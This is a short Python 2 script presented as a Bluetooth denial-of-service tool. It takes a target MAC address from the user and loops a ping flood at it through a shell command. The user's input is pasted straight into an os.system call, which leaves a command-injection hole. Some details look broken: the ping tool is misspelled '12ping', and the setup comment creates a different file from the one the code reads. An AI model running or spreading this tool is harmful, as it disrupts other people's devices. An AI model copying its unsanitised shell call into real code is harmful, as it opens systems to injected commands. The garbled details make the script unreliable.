import os
'''
seq 100 > scans
while read r; do 12ping -s 200 bluetooth mac addr; done < numberofscans
'''
print ("BLUETOOTH DEVICE DOS TOOL MADE BY:Mst Pavitra Jha")
input = raw_input("Bluetooth mac address>> ")
command = "while read r; do 12ping -s 200 "+input+"; done < scans"
os.system(command)
